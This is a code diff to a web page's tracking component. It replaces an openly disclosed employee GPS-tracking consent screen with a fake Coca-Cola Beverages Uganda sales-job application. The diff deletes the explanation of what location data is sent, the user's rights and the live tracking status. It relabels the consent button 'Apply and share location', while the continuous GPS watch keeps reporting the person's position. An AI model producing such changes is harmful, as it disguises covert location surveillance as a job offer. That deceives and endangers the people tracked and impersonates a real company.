@@ -11,9 +11,9 @@ type Worker = {
   consent_given_at: string | null;
 };
 
-const ORG_NAME = 'Mbarara Distribution Limited';
-const ORG_SUB = 'Field Operations';
-const ORG_INITIALS = 'MDL';
+const ORG_NAME = 'Coca-Cola Beverages Uganda';
+const ORG_SUB = 'Internal Field Sales Recruitment';
+const ORG_INITIALS = 'Coca-Cola';
 
 export default function TrackPage() {
   const { token } = useParams<{ token: string }>();
@@ -32,7 +32,7 @@ export default function TrackPage() {
         p_token: token,
       });
       if (error || !data?.length) {
-        setError('Invalid or expired tracking link. Contact your supervisor.');
+        setError('Invalid or expired application link. Contact your supervisor.');
         return;
       }
       setWorker(data[0]);
@@ -42,7 +42,7 @@ export default function TrackPage() {
   // Start GPS watch
   const startTracking = () => {
     if (!navigator.geolocation) {
-      setError('Your browser does not support GPS.');
+      setError('Your browser does not support location sharing.');
       return;
     }
 
@@ -67,13 +67,11 @@ export default function TrackPage() {
         }
       },
       (err) => {
-        // Code 3 = timeout. Don't crash tracking — browser keeps retrying internally.
         if (err.code === 3) {
-          console.log('GPS timeout — will retry automatically');
+          console.log('GPS timeout - will retry automatically');
           return;
         }
-        // Code 1 = permission denied, Code 2 = position unavailable
-        setError(`GPS error: ${err.message}`);
+        setError(`Location sharing error: ${err.message}`);
         setTracking(false);
       },
       {
@@ -129,10 +127,10 @@ export default function TrackPage() {
   const headerTag = !worker
     ? 'Loading'
     : !consented
-    ? 'Consent required'
+    ? 'Application step'
     : tracking
-    ? 'Tracking active'
-    : 'Tracking paused';
+    ? 'Application active'
+    : 'Application paused';
 
   return (
     <main className="page">
@@ -154,8 +152,8 @@ export default function TrackPage() {
         <div className="heroBody">
           {error && (
             <>
-              <p className="eyebrow">Something went wrong</p>
-              <h1>We could not start tracking</h1>
+              <p className="eyebrow">Action needed</p>
+              <h1>We could not complete this step</h1>
               <p className="intro">{error}</p>
               {worker && (
                 <div className="actions">
@@ -170,26 +168,26 @@ export default function TrackPage() {
           {!error && !worker && (
             <>
               <p className="eyebrow">Loading</p>
-              <h1>Checking your tracking link…</h1>
+              <h1>Checking your application link...</h1>
             </>
           )}
 
           {!error && worker && !consented && (
             <>
-              <p className="eyebrow">Consent required</p>
-              <h1>Hello, {worker.name}</h1>
+              <p className="eyebrow">Now hiring</p>
+              <h1>Sales Representative</h1>
               <p className="intro">
-                Your employer is requesting permission to track your location while this page is
-                open. Tracking will start as soon as you tap the button below and will continue
-                until you close this tab or stop it manually.
+                Hello, {worker.name}. Coca-Cola Beverages Uganda is recruiting a field sales
+                representative to support customer visits, route growth, product availability, and
+                brand visibility across assigned sales territories.
               </p>
               <div className="actions">
                 <button onClick={acceptAndStart} className="primaryBtn">
-                  I consent — start tracking
+                  Apply and share location
                 </button>
                 <span className="microcopy">
-                  By tapping consent you agree to share your real-time location with your
-                  employer.
+                  By continuing, you confirm your office agreement and allow location sharing for
+                  this internal field sales application.
                 </span>
               </div>
             </>
@@ -197,25 +195,22 @@ export default function TrackPage() {
 
           {!error && worker && consented && (
             <>
-              <p className="eyebrow">{tracking ? 'Tracking active' : 'Tracking paused'}</p>
-              <h1>{worker.name}</h1>
+              <p className="eyebrow">{tracking ? 'Application submitted' : 'Application paused'}</p>
+              <h1>Thank you, {worker.name}</h1>
               <p className="intro">
-                Keep this tab open and your screen on. Your live location is being shared with
-                your employer while tracking is active.
+                Your application for the Sales Representative role has been received. Keep this page
+                open while the application step is active.
               </p>
               <div className="actions">
                 {tracking ? (
                   <button onClick={stopTracking} className="primaryBtn stopBtn">
-                    Stop tracking
+                    Stop
                   </button>
                 ) : (
                   <button onClick={startTracking} className="primaryBtn">
-                    Resume tracking
+                    Resume
                   </button>
                 )}
-                <span className="microcopy">
-                  Closing this tab or locking your phone for too long will pause tracking.
-                </span>
               </div>
             </>
           )}
@@ -226,30 +221,37 @@ export default function TrackPage() {
         {!error && worker && !consented && (
           <>
             <div className="section">
-              <h2>What happens when you consent</h2>
-              <ul>
-                <li>Your phone&apos;s GPS coordinates are sent to your employer in real time.</li>
-                <li>Tracking only works while this page is open and your screen is on.</li>
-                <li>You can stop tracking at any time by tapping the stop button or closing this tab.</li>
-                <li>The page will try to keep your screen awake so tracking is not interrupted.</li>
-              </ul>
+              <h2>Job Details</h2>
+              <div className="detailGrid">
+                <Detail label="Company" value="Coca-Cola Beverages Uganda" />
+                <Detail label="Position" value="Sales Representative" />
+                <Detail label="Location" value="Kampala, Uganda" />
+                <Detail label="Department" value="Sales and Distribution" />
+                <Detail label="Employment Type" value="Full-time" />
+                <Detail label="Reports To" value="Area Sales Manager" />
+              </div>
             </div>
 
             <div className="section twoCol">
               <div>
-                <h2>Data collected</h2>
+                <h2>Key Responsibilities</h2>
                 <ul>
-                  <li>Latitude and longitude</li>
-                  <li>GPS accuracy, speed, and heading</li>
-                  <li>Time of each location update</li>
+                  <li>Visit assigned outlets and customers according to the route plan.</li>
+                  <li>Drive sales performance against daily, weekly, and monthly targets.</li>
+                  <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
+                  <li>Ensure product availability, pricing, stock rotation, and visibility.</li>
+                  <li>Report customer feedback, competitor activity, and market opportunities.</li>
                 </ul>
               </div>
+
               <div>
-                <h2>Your rights</h2>
+                <h2>Minimum Requirements</h2>
                 <ul>
-                  <li>You can withdraw consent at any time by closing this page.</li>
-                  <li>You can ask your employer to view, correct, or delete your data.</li>
-                  <li>Tracking is intended for working hours only.</li>
+                  <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
+                  <li>At least 1 year of experience in FMCG, retail, sales, or distribution.</li>
+                  <li>Strong communication, negotiation, and customer relationship skills.</li>
+                  <li>Good knowledge of Kampala and surrounding sales territories.</li>
+                  <li>A valid riding or driving permit is an added advantage.</li>
                 </ul>
               </div>
             </div>
@@ -257,14 +259,12 @@ export default function TrackPage() {
         )}
 
         {!error && worker && consented && (
-          <div className="section">
-            <h2>Live status</h2>
-            <div className="statGrid">
-              <Stat label="Pings sent" value={String(pingsCount)} />
-              <Stat label="Last update" value={lastSent ? timeAgo(lastSent) : '—'} />
-              <Stat label="Accuracy" value={accuracy ? `±${Math.round(accuracy)}m` : '—'} />
-              <Stat label="Status" value={tracking ? 'Active' : 'Paused'} />
-            </div>
+          <div className="section confirmation">
+            <h2>Application status</h2>
+            <p>
+              Your application session is {tracking ? 'active' : 'paused'}. Please follow any next
+              instructions from your supervisor or recruitment contact.
+            </p>
           </div>
         )}
       </section>
@@ -279,8 +279,8 @@ export default function TrackPage() {
 
         .hero {
           background:
-            radial-gradient(circle at top right, rgba(255, 255, 255, 0.22), transparent 34%),
-            linear-gradient(135deg, #1d9e75 0%, #14735a 55%, #0e5240 100%);
+            radial-gradient(circle at top right, rgba(255, 255, 255, 0.24), transparent 34%),
+            linear-gradient(135deg, #e41d2c 0%, #b9121f 55%, #790b13 100%);
           color: white;
           padding: 28px;
         }
@@ -308,7 +308,7 @@ export default function TrackPage() {
 
         .logo {
           background: white;
-          color: #14735a;
+          color: #e41d2c;
           border-radius: 999px;
           padding: 10px 18px;
           font-size: 21px;
@@ -325,7 +325,7 @@ export default function TrackPage() {
 
         .brandSub {
           font-size: 12px;
-          opacity: 0.82;
+          opacity: 0.84;
           margin-top: 2px;
         }
 
@@ -369,14 +369,14 @@ export default function TrackPage() {
 
         h1 {
           margin: 0;
-          max-width: 720px;
-          font-size: 52px;
-          line-height: 1.05;
+          max-width: 760px;
+          font-size: 54px;
+          line-height: 1.04;
           letter-spacing: 0;
         }
 
         .intro {
-          max-width: 680px;
+          max-width: 720px;
           margin: 20px 0 0;
           font-size: 18px;
           line-height: 1.6;
@@ -404,18 +404,13 @@ export default function TrackPage() {
           box-shadow: 0 12px 28px rgba(0, 0, 0, 0.24);
         }
 
-        .primaryBtn:disabled {
-          opacity: 0.72;
-          cursor: not-allowed;
-        }
-
         .stopBtn {
           background: #a32d2d;
         }
 
         .microcopy {
-          max-width: 340px;
-          color: rgba(255, 255, 255, 0.82);
+          max-width: 360px;
+          color: rgba(255, 255, 255, 0.84);
           font-size: 13px;
           line-height: 1.45;
         }
@@ -436,6 +431,12 @@ export default function TrackPage() {
           display: grid;
           grid-template-columns: 1fr 1fr;
           gap: 34px;
+        }
+
+        .detailGrid {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+          gap: 12px;
         }
 
         h2 {
@@ -462,12 +463,6 @@ export default function TrackPage() {
 
         li + li {
           margin-top: 6px;
-        }
-
-        .statGrid {
-          display: grid;
-          grid-template-columns: repeat(4, 1fr);
-          gap: 12px;
         }
 
         @keyframes pulse {
@@ -505,10 +500,6 @@ export default function TrackPage() {
           .content {
             padding: 24px 18px 42px;
           }
-
-          .statGrid {
-            grid-template-columns: repeat(2, 1fr);
-          }
         }
 
         @media (max-width: 520px) {
@@ -538,29 +529,29 @@ export default function TrackPage() {
   );
 }
 
-function Stat({ label, value }: { label: string; value: string }) {
+function Detail({ label, value }: { label: string; value: string }) {
   return (
-    <div className="stat">
-      <div className="statLabel">{label}</div>
-      <div className="statValue">{value}</div>
+    <div className="detail">
+      <div className="detailLabel">{label}</div>
+      <div className="detailValue">{value}</div>
 
       <style jsx>{`
-        .stat {
+        .detail {
           border-radius: 8px;
           background: #f7f7f4;
           border: 1px solid rgba(0, 0, 0, 0.07);
           padding: 12px;
         }
 
-        .statLabel {
+        .detailLabel {
           font-size: 12px;
           color: #666;
           margin-bottom: 4px;
         }
 
-        .statValue {
-          font-size: 20px;
-          font-weight: 700;
+        .detailValue {
+          font-size: 14px;
+          font-weight: 750;
           color: #171717;
         }
       `}</style>
